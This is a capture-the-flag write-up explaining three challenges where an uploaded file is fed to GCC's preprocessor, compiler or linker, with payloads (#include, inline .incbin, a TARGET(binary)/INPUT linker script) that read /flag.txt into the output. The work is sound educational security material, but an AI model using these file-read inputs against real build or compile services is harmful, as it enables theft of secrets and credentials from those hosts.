# Preprocessin, Compilin and Linkin Park

These three challenges were independent but sharing a common a concept: you have a website where you can submit an input file, which will be passed to a GCC command, and you get the output.
You have to use this service to exfiltrate the "/flag.txt" file, without generating any error.
In these three challenges, your input file is renamed as `main.*`, with a specific extension, and GCC is passed slightly different parameters instructing it to perform different operations. Note that the extension is also relevant in GCC's decision of what to do with a file: https://gcc.gnu.org/onlinedocs/gcc/Overall-Options.html.

NB: all the flag are deformed Linkin Park lyrics, as a little joke.

## Preprocessin Park

- Category: Intro/Misc
- Difficulty: Very Easy
- Number of solves: 89

In this challenge, the GCC command is the following:
```
/usr/bin/gcc -E main.c -o main.i
```
Looking at the [GCC documentation](https://gcc.gnu.org/onlinedocs/gcc/Overall-Options.html), we can understand the meaning of the options:
```
file.c
    C source code that must be preprocessed.

-E
    Stop after the preprocessing stage; do not run the compiler proper. The output is in the form of preprocessed source code, which is sent to the standard output.

-o file
    Place the primary output in file file. This applies to whatever sort of output is being produced, whether it be an executable file, an object file, an assembler file or preprocessed C code.
```

So, this command will run only the C preprocessor on our input. The preprocessor is the program that process all the `#` directives before compiling our C code. To solve the challenge, we can use the most famous preprocessor directive, `#include`, which copies the content of another file into the file. So, by sending a file with the following content, we can exfiltrate the flag:
```c
#include "/flag.txt"
```

Flag: `RM{Put_under_the_preprocessure_of_walking_in_your_shoes_0773eea99a5445b06edb56882cba9541}
`

## Compilin Park

- Category: Misc
- Difficulty: Easy
- Number of solves: 35

The GCC command in this challenge is:
```
/usr/bin/gcc -Wall -Wextra -Werror -c main.i -o main.o
```
Some new GCC options here, let's see what they mean:
```
file.i
    C source code that should not be preprocessed.

-c
    Compile or assemble the source files, but do not link. The linking stage simply is not done. The ultimate output is in the form of an object file for each source file. 
```
And the three [warning options](https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html) enable all warnings and turn them into errors. So, the command compiles the input without running the preprocessor on it, and does not link the resulting object file.

We need a way to include the file in the output without using any preprocessor directive, and without generating any warning. I found the solution at the bottom of a [StackOverflow thread](https://stackoverflow.com/a/71023862), but learned afterwards that this trick had already been used in [other CTFs](https://rpis.ec/blog/hxp-26c3-ctf-compilerbot/). It consists in using [inline assembly](https://en.cppreference.com/w/c/language/asm) to include a raw file in the program. So sending a file with the following content will give you an object file with the flag inside:
```c
asm("fileData:    .incbin \"/flag.txt\"");
```

Flag: `RM{This_is_what_you_asked_for_heavy_is_the_compiler_6b2c6a29b32fccae41ab5cd12516aa50}`

## Linkin Park

- Category: Misc
- Difficulty: Easy
- Number of solves: 0 :-(

This is the only challenge from mine that did not get any solve at the end of the CTF. The GCC command is:
```
/usr/bin/gcc -fuse-ld=bfd -Wl,--fatal-warnings main.o -o main
```
Here is the meaning of the new options, from [here](https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html). Note that GCC does not have a specific handling for `.o`, so it falls back to passing it to the linker without looking at it:
```
object-file-name
    A file name that does not end in a special recognized suffix is considered to name an object file or library. (Object files are distinguished from libraries by the linker according to the file contents.) If linking is done, these object files are used as input to the linker.

-fuse-ld=bfd
    Use the bfd linker instead of the default linker.

-Wl,option
    Pass option as an option to the linker.
```
As its name indicates, `--fatal-warnings` makes the linker crash if any warning is raised. BFD should be the default linker, but it is forced just in case. The solution to the challenge also works with GNU gold and LLD, but not with `mold` (exercise to the reader once you have the solution: why?).

So this time our input will be linked to make an executable. If we play a bit with this command, we can notice the following:
```
$ echo "Hello" > main.o
$ gcc -fuse-ld=bfd -Wl,--fatal-warnings main.o -o main 
/usr/bin/ld.bfd:main.o: file format not recognized; treating as linker script
/usr/bin/ld.bfd:main.o:0: syntax error
collect2: error: ld returned 1 exit status
```
Interesting, it seems that if we send a plaintext instead of an object file, the linker treats it as a "linker script". But what is a linker script? Let's RTFM: https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_chapter/ld_3.html
We notice there is an "INPUT" command, which can be used to add a file to the linking:
```
INPUT ( file, file, ... )
INPUT ( file file ... )
    Use this command to include binary input files in the link, without including them in a particular section definition.
```
Let's try to send this as input:
```
INPUT(/flag.txt)
```
We get:
```
$ gcc -fuse-ld=bfd -Wl,--fatal-warnings main.o -o main
/usr/bin/ld.bfd:/flag.txt: file format not recognized; treating as linker script
/usr/bin/ld.bfd:/flag.txt:1: syntax error
collect2: error: ld returned 1 exit status
```
Seems that we are on the right way, "flag.txt" was added to the linking, but then since it is plaintext and not an elf, it is treated as a linker script too, but it is obviously not a valid linker script.
Reading more, we find the "TARGET" command:
```
TARGET ( format )
    When ld is configured to support multiple object code formats, you can use this command to change the input-file object code format (like the command-line option `-b' or its synonym `--format'). The argument format is one of the strings used by BFD to name binary formats.
```
And one of the possible targets is "binary", where every file is treated as a raw binary, which is very useful when you want to create an elf from a raw binary (e.g. a shellcode, or an embedded firmware).
Let's try this:
```
TARGET(binary)
INPUT(/flag.txt)
```
```
$ gcc -fuse-ld=bfd -Wl,--fatal-warnings main.o -o main
/usr/bin/ld.bfd: /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/libgcc.a:(.data+0x0): multiple definition of `_binary__usr_lib_gcc_x86_64_pc_linux_gnu_15_1_1_libgcc_a_start'; /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/libgcc.a:(.data+0x0): first defined here
/usr/bin/ld.bfd: /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/libgcc.a:(.data+0x32333c): multiple definition of `_binary__usr_lib_gcc_x86_64_pc_linux_gnu_15_1_1_libgcc_a_end'; /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/libgcc.a:(.data+0x32333c): first defined here
/usr/bin/ld.bfd: /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/../../../../lib/libgcc_s.so:(.data+0x0): multiple definition of `_binary__usr_lib_gcc_x86_64_pc_linux_gnu_15_1_1_____________lib_libgcc_s_so_start'; /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/../../../../lib/libgcc_s.so:(.data+0x0): first defined here
/usr/bin/ld.bfd: /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/../../../../lib/libgcc_s.so:(.data+0x84): multiple definition of `_binary__usr_lib_gcc_x86_64_pc_linux_gnu_15_1_1_____________lib_libgcc_s_so_end'; /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/../../../../lib/libgcc_s.so:(.data+0x84): first defined here
/usr/bin/ld.bfd: /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/../../../../lib/Scrt1.o: in function `_start':
(.text+0x1b): undefined reference to `main'
/usr/bin/ld.bfd: (.text+0x21): undefined reference to `__libc_start_main'
/usr/bin/ld.bfd: /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/crtbeginS.o:(.text+0xa): undefined reference to `__TMC_END__'
/usr/bin/ld.bfd: /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/crtbeginS.o:(.text+0x3a): undefined reference to `__TMC_END__'
/usr/bin/ld.bfd: main: hidden symbol `__TMC_END__' isn't defined
/usr/bin/ld.bfd: final link failed: bad value
collect2: error: ld returned 1 exit status
```
Ouch. What happened here? To understand it, we need to see the actual call to the linker that GCC does under the hood. We can do this by adding the `-###` parameter at the end of the command:
```
$ gcc -fuse-ld=bfd -Wl,--fatal-warnings main.o -o main "-###"
...
 /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/collect2 -plugin /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/liblto_plugin.so "-plugin-opt=/usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/lto-wrapper" "-plugin-opt=-fresolution=/tmp/cc6c0lhC.res" "-plugin-opt=-pass-through=-lgcc" "-plugin-opt=-pass-through=-lgcc_s" "-plugin-opt=-pass-through=-lc" "-plugin-opt=-pass-through=-lgcc" "-plugin-opt=-pass-through=-lgcc_s" --build-id --eh-frame-hdr "--hash-style=gnu" -m elf_x86_64 -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie "-fuse-ld=bfd" -o main /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/../../../../lib/Scrt1.o /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/../../../../lib/crti.o /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/crtbeginS.o -L/usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1 -L/usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/../../../../lib -L/lib/../lib -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/../../.. -L/lib -L/usr/lib --fatal-warnings main.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/crtendS.o /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/../../../../lib/crtn.o
...
```
There are many parameters here, but we can see that `main.o` is not the only object file linked here. There are also `Scrt1.o`, `crti.o`, `crtbeginS.o`, and `crtendS.o`. What are these files? They contain the [C runtime startup code](https://stackoverflow.com/a/16436294).
For the program to be properly linked, `crtendS.o` must be handled as an ELF (because it contains symbols referenced by the previous objects). So we need to switch the target back to ELF once the flag is included:
```
TARGET(binary)
INPUT(/flag.txt)
TARGET(elf64-x86-64)
```
And we get:
```
$ gcc -fuse-ld=bfd -Wl,--fatal-warnings main.o -o main
/usr/bin/ld.bfd: /usr/lib/gcc/x86_64-pc-linux-gnu/15.1.1/../../../../lib/Scrt1.o: in function `_start':
(.text+0x1b): undefined reference to `main'
collect2: error: ld returned 1 exit status
```
Now we are missing the `main` function... The thing is, we do not need to have a working `main` function, but only to give a value to the `main` symbol. This can be done very easily in linker script:
```
TARGET(binary)
INPUT(/flag.txt)
TARGET(elf64-x86-64)
main = 1337;
```
And this time we do not get any error!
```
gcc -fuse-ld=bfd -Wl,--fatal-warnings main.o -o main
$ file main
main: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c0efab96e318a585506ca41332b64a218862f940, for GNU/Linux 4.4.0, not stripped
$ strings main | grep "RM{"
RM{FAKE_FLAG}
```

We then just need to submit this to the server to get the flag: `RM{I_m_lost_in_these_memories_linking_behind_my_own_illusion_dadc3628b6b4f67c6f702d63d36e0ac1}
`